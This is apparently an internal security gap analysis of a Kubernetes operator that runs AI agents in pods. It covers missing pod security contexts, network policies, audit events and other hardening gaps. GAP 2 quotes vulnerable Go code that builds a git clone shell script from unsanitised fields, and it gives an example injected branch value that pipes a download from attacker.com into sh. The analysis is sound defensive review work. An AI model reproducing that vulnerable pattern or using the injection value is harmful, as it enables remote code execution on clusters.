# Kubernetes Operator (agent-operator-go) — Enterprise Security Gap Analysis

## Architecture Overview

The operator defines 5 CRDs in `agent.xonovex.com/v1alpha1`:

| CRD | Purpose | Key Fields |
|---|---|---|
| **AgentRun** | Creates Jobs for agent execution | harnessRef/harness, providerRef/provider, workspaceRef/workspace, toolchainRef/toolchain, resources, timeout, runtimeClassName |
| **AgentHarness** | Agent type defaults | type, defaultImage, defaultResources, defaultTimeout, defaultRuntimeClassName, env |
| **AgentProvider** | Reusable provider config | authTokenSecretRef, environment, cliArgs |
| **AgentWorkspace** | Shared RWX PVC + worktrees | repository, storageClass, storageSize, sharedVolumes, git/jj config |
| **AgentToolchain** | Nix package provisioning | packages, image |

4-concern composition: each AgentRun resolves harness + provider + workspace + toolchain via ref or inline spec.

## What Works Well

**Runtime class isolation** — `runtimeClassName` propagates correctly to PodSpec (`job.go:64`). Kata Containers and gVisor both have comprehensive E2E tests that verify actual VM/sandbox isolation (kernel version comparison, `/dev/pmem0` check, dmesg gVisor detection).

**Secret management** — Provider auth tokens use `SecretKeyRef` references, never stored in CRD fields. Provider controller validates secret existence and key presence (`agentprovider_controller.go`).

**Timeout enforcement** — `ActiveDeadlineSeconds` on Jobs, controller monitors elapsed time, transitions to `TimedOut` phase. Default 1h, workspace init jobs get 10m.

**Resource limits** — CPU/memory requests and limits supported via `corev1.ResourceRequirements`, inheritable from AgentHarness defaults.

**Workspace isolation** — Per-agent git worktrees under `/workspace-wt/{agentrun-name}/` with shared RWX PVC for the base checkout.

**Ownership and cleanup** — Jobs owned by AgentRuns, PVCs owned by AgentRuns/AgentWorkspaces. K8s garbage collection handles cascading deletion. `BackoffLimit: 0` prevents retry loops.

## Gaps

### GAP 1: No SecurityContext on Agent Pods

**Severity: Critical** | **Complexity: Small**

`container.go:57-67` — main container has no SecurityContext:

```go
return []corev1.Container{
    {
        Name:         "agent",
        Image:        image,
        Command:      command,
        Args:         args,
        Env:          env,
        WorkingDir:   workspaceMountPath,
        VolumeMounts: volumeMounts,
        // No SecurityContext
    },
}
```

`job.go:57-67` — PodSpec has no PodSecurityContext:

```go
Spec: corev1.PodSpec{
    RestartPolicy:    corev1.RestartPolicyNever,
    InitContainers:   BuildInitContainers(...),
    Containers:       BuildMainContainers(...),
    Volumes:          volumes,
    NodeSelector:     run.Spec.NodeSelector,
    Tolerations:      run.Spec.Tolerations,
    RuntimeClassName: run.Spec.RuntimeClassName,
    // No SecurityContext, no PodSecurityContext
},
```

**Irony**: The operator's own manager deployment (`config/manager/manager.yaml`) correctly sets `runAsNonRoot: true`, `allowPrivilegeEscalation: false`, `capabilities.drop: [ALL]` — but the agent pods it creates have none of this.

**What's needed**: Add to AgentRunSpec or hardcode sensible defaults:

- `runAsNonRoot: true`
- `allowPrivilegeEscalation: false`
- `readOnlyRootFilesystem: true` (with writable emptyDir for /tmp)
- `capabilities.drop: ["ALL"]`
- `seccompProfile: { type: RuntimeDefault }`

### GAP 2: Shell Injection in buildCloneScript

**Severity: Critical** | **Complexity: Small**

`container.go:70-91` concatenates user-provided strings directly into a shell script:

```go
func buildCloneScript(repo agentv1alpha1.RepositorySpec, wsType agentv1alpha1.WorkspaceType) string {
    script := "set -e\n"
    script += "cd " + workspaceMountPath + "\n"
    script += "git clone"
    if repo.Branch != "" {
        script += " --branch " + repo.Branch  // Unsanitized!
    }
    script += " " + repo.URL + " .\n"          // Unsanitized!
    if repo.Commit != "" {
        script += "git fetch origin " + repo.Commit + "\n"  // Unsanitized!
    }
    // ...
}
```

The webhook (`agentrun_webhook.go:74-115`) validates mutual exclusivity and required fields but **does not validate input format** — no regex check on URL, branch, or commit values.

A malicious AgentRun with `branch: "main; curl attacker.com/exfil | sh"` would execute arbitrary code in the init container.

**What's needed**: Either:

- Validate URL/branch/commit format in the webhook (regex allowlist)
- Use `git clone -- "$URL"` with proper shell quoting
- Or use `exec.Command("git", "clone", "--branch", branch, url, ".")` instead of shell scripts

### GAP 3: No NetworkPolicy Generation

**Severity: High** | **Complexity: Medium**

The operator creates Jobs and PVCs but never creates `NetworkPolicy` resources. Agent pods have unrestricted network access within the cluster and to the internet.

There are zero references to `NetworkPolicy` anywhere in the operator codebase.

**What's needed**: Add to `AgentRunSpec` or create a cluster-wide default:

```go
// Option A: Per-run network policy
type AgentRunSpec struct {
    // ...
    NetworkPolicy *NetworkPolicySpec `json:"networkPolicy,omitempty"`
}

type NetworkPolicySpec struct {
    EgressRules []networkingv1.NetworkPolicyEgressRule `json:"egress,omitempty"`
    DenyAll     bool `json:"denyAll,omitempty"`
}
```

The controller would create a `NetworkPolicy` owned by the AgentRun, targeting pods with the `agent.xonovex.com/agent-type` label.

### GAP 4: No Central Policy CRD

**Severity: High** | **Complexity: Medium**

AgentHarness provides namespace-level defaults but these are **advisory, not enforced** — AgentRun can override everything (image, resources, runtimeClassName, timeout). There is no mechanism to enforce minimum security requirements across a namespace or cluster.

**What's needed**: A `ClusterAgentPolicy` or `AgentPolicy` CRD:

```yaml
apiVersion: agent.xonovex.com/v1alpha1
kind: AgentPolicy
metadata:
  name: enterprise-policy
  namespace: ai-agents
spec:
  enforced:                    # Cannot be overridden
    runtimeClassName: kata     # All runs must use Kata
    securityContext:
      runAsNonRoot: true
      allowPrivilegeEscalation: false
    networkPolicy:
      denyAll: true
      allowEgress:
        - to: [registry.npmjs.org, api.anthropic.com]
    maxTimeout: 2h
    maxResources:
      cpu: "4"
      memory: "8Gi"
  defaults:                    # Can be overridden
    image: ghcr.io/org/agent-image:latest
    timeout: 30m
```

The AgentRun webhook would validate against the policy, rejecting runs that violate enforced constraints.

### GAP 5: No Ephemeral Storage Limits

**Severity: Medium** | **Complexity: Small**

Resource limits only cover CPU and memory. The Nix toolchain init container uses an `EmptyDir` volume for `/nix-env` with no size limit:

```go
// toolchain_nix.go
Volumes: []corev1.Volume{{
    Name: "nix-env",
    VolumeSource: corev1.VolumeSource{
        EmptyDir: &corev1.EmptyDirVolumeSource{},  // No SizeLimit
    },
}}
```

An agent could fill the node's ephemeral storage, causing eviction of other pods.

**What's needed**: Add `ephemeral-storage` to ResourceRequirements and `SizeLimit` to EmptyDir volumes.

### GAP 6: No Audit Events

**Severity: High** | **Complexity: Medium**

The controller uses `controller-runtime/pkg/log` for operational logging but produces no security audit events. There is no record of:

- Which user/service account created an AgentRun
- What secrets were accessed during provider resolution
- What commands were executed inside agent pods
- Whether pods attempted network access

**What's needed**:

- Emit K8s Events on security-relevant actions (secret access, pod creation, timeout)
- Add structured fields to controller logs (agentRun name, provider, runtime class)
- Optionally emit OTEL traces from the controller for centralized observability

### GAP 7: No Confidential Computing Support

**Severity: Medium** | **Complexity: Medium**

No references to Azure Confidential Containers, Intel SGX, AMD SEV-SNP, or attestation.

The `runtimeClassName` field theoretically supports CVM runtimes (e.g., `kata-cc`), but there is:

- No CRD field for attestation configuration
- No node affinity for confidential compute node pools
- No documentation for AKS Confidential Containers setup

**What's needed for AKS**:

- Add `confidentialComputing` field to AgentRunSpec (attestation policy, TEE type)
- Auto-add node affinity for `kubernetes.azure.com/confidential-computing: true` label
- Document AKS Confidential Containers integration

### GAP 8: No Pod TTL After Completion

**Severity: Low** | **Complexity: Small**

Jobs don't set `ttlSecondsAfterFinished`:

```go
// job.go
Spec: batchv1.JobSpec{
    ActiveDeadlineSeconds: &activeDeadlineSeconds,
    BackoffLimit:          &backoffLimit,
    // No TTLSecondsAfterFinished
    Template: ...
}
```

Completed/failed Jobs and their pods remain until the AgentRun is deleted. In high-throughput environments, this creates resource pressure.

**What's needed**: Add `TTLSecondsAfterFinished` field to AgentRunSpec (or default to e.g., 3600).

### GAP 9: Workspace Init Job Has No RuntimeClassName

**Severity: Medium** | **Complexity: Small**

The E2E gVisor tests explicitly verify this: "workspace init Job correctly has NO runtimeClassName". The init job that clones the repository runs outside the sandbox runtime, meaning a malicious git server could exploit the clone process in an unsandboxed container.

This is documented behavior per `agentworkspace_controller.go` — only the agent Job gets the runtime class.

**What's needed**: Propagate `runtimeClassName` to workspace init jobs, or add a separate field for init job isolation.

### GAP 10: No Webhook Validation on AgentProvider

**Severity: Low** | **Complexity: Small**

`agentprovider_webhook.go` is empty — no validation:

```go
func (w *AgentProviderWebhook) validate(_ *agentv1alpha1.AgentProvider) (admission.Warnings, error) {
    return nil, nil
}
```

No validation that `authTokenSecretRef` references a real secret, that `environment` keys are safe, or that `cliArgs` don't contain injection vectors.

## Summary Matrix

| Gap | Severity | Complexity | Category |
|---|---|---|---|
| No SecurityContext on agent pods | **Critical** | Small | Pod hardening |
| Shell injection in buildCloneScript | **Critical** | Small | Input validation |
| No NetworkPolicy generation | **High** | Medium | Network isolation |
| No central policy enforcement CRD | **High** | Medium | Governance |
| No audit events | **High** | Medium | Observability |
| No ephemeral storage limits | **Medium** | Small | Resource control |
| No confidential computing support | **Medium** | Medium | Azure integration |
| Workspace init job unsandboxed | **Medium** | Small | Isolation consistency |
| No pod TTL after completion | **Low** | Small | Lifecycle |
| Empty AgentProvider webhook | **Low** | Small | Validation |

## Recommended Priority

### Immediate (before AKS deployment)

1. Fix shell injection in `buildCloneScript`
2. Add SecurityContext to agent pods
3. Add NetworkPolicy generation

### Before enterprise rollout

4. Central policy CRD with enforcement
5. Structured audit events
6. Ephemeral storage limits

### For Azure Confidential Containers roadmap

7. Confidential computing fields + AKS node affinity
8. Workspace init job runtime class propagation
